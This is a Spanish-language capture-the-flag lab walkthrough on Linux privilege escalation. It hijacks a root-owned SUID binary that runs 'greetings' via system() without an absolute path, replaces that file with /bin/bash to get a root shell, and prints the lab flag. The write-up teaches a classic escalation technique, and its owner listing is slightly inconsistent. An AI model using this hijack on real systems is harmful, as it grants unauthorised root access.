# 🔧 Linux: Explotación de Programas Setuid (SUID)

## 🎯 Objetivo

Identificar un binario con el bit **SUID** (Set User ID) activado que pertenece a `root` y que ejecuta otro programa sin especificar una ruta absoluta. Al reemplazar ese programa dependiente por una shell, se obtiene una consola con privilegios de superusuario y se captura la bandera.

---

## 🔍 1. Enumeración inicial

### 📡 Verificar conectividad

```bash
ping -c 4 target.ine.local
```

**Salida esperada:**
```
64 bytes from target.ine.local: icmp_seq=1 ttl=64 time=0.350 ms
...
```
El objetivo está en línea.

### 🌐 Acceder al terminal web

Abrir el navegador y visitar:

```
http://target.ine.local:8000
```

Aparece una terminal Linux que opera como el usuario **student**, igual que en el laboratorio anterior.

---

## 🧪 2. Análisis del directorio del estudiante

Se listan los archivos con detalles de permisos y propietarios:

```bash
ls -l
```

**Salida esperada:**
```
total 16
-rwxr-xr-x 1 user  user  1117080 Jan 24 05:34 greetings
-rwsr-xr-x 1 root  root     8344 Jun 11  2024 welcome
```

Se observa:

- **`greetings`** es un ejecutable normal propiedad de `student`.
- **`welcome`** tiene el bit **SUID** activado (`s` en los permisos del propietario) y pertenece a **root**. Esto significa que, sin importar quién lo ejecute, el proceso se ejecuta con los privilegios de `root`.

### 🔍 Identificar el tipo de archivo

```bash
file welcome
```

**Salida esperada:**
```
welcome: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ...
```

Es un binario ELF estándar.

### ▶️ Ejecutar el binario

```bash
./welcome
```

**Salida esperada:**
```
Welcome!
```
Muestra un simple mensaje de bienvenida.

---

## 🔎 3. Investigación del binario con `strings`

Para entender qué hace `welcome`, se extraen las cadenas de texto incrustadas en él:

```bash
strings welcome
```

**Fragmento relevante de la salida:**
```
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
greetings
Welcome!
```

| Cadena | Significado |
|--------|-------------|
| `setuid` | Llama a la función `setuid()` (típico en binarios SUID) |
| `system` | Utiliza la función `system()` para ejecutar otro comando |
| `greetings` | Es el nombre del archivo que el binario intenta ejecutar |

🔑 **Interpretación:**  
`welcome` invoca `system("greetings")` **sin una ruta absoluta**. Como `greetings` está en el directorio actual y es modificable por el usuario `student`, se puede reemplazar por cualquier otro programa, incluida una shell.

---

## 🛠️ 4. Sustitución de `greetings` por `/bin/bash`

Dado que `greetings` es propiedad de `student` y tiene permisos de escritura, se puede eliminar y reemplazar.

### ❌ Eliminar el binario original

```bash
rm greetings
```

### 📋 Copiar `/bin/bash` en su lugar

```bash
cp /bin/bash greetings
```

Ahora, cuando `welcome` ejecute `greetings`, en realidad lanzará una shell **Bash** con los privilegios heredados del SUID (es decir, como `root`).

---

## 🚀 5. Ejecución del binario SUID y escalada a root

```bash
./welcome
```

Esta vez no se ve el mensaje de bienvenida, sino un nuevo prompt. Se comprueba la identidad:

```bash
whoami
```

**Salida esperada:**
```
root
```

✅ El usuario `student` se ha convertido en **superusuario**.

---

## 🏁 6. Captura de la bandera

La bandera se encuentra en el directorio `/root`, accesible solo por el administrador del sistema.

```bash
cd /root
ls -l
```

**Salida esperada:**
```
total 4
-rw------- 1 root root 32 Jan 01 12:00 flag
```

```bash
cat flag
```

**Bandera obtenida:**  
`b92bcdc876d52108778e2d81f3b01494`

---

## 🧠 Resumen del ataque

| Paso | Comando | Propósito |
|------|---------|-----------|
| 1 | `ls -l` | Detectar el bit SUID en `welcome` |
| 2 | `strings welcome` | Descubrir que llama a `greetings` sin ruta absoluta |
| 3 | `rm greetings` + `cp /bin/bash greetings` | Sustituir el programa dependiente por una shell |
| 4 | `./welcome` | Ejecutar el binario SUID y heredar UID 0 |
| 5 | `whoami` | Confirmar privilegios de root |
| 6 | `cat /root/flag` | Leer la bandera |

Los binarios SUID que invocan otros programas sin especificar una ruta absoluta constituyen una vulnerabilidad clásica de escalada de privilegios en Linux, ya que un usuario local puede secuestrar la ejecución reemplazando el programa dependiente.
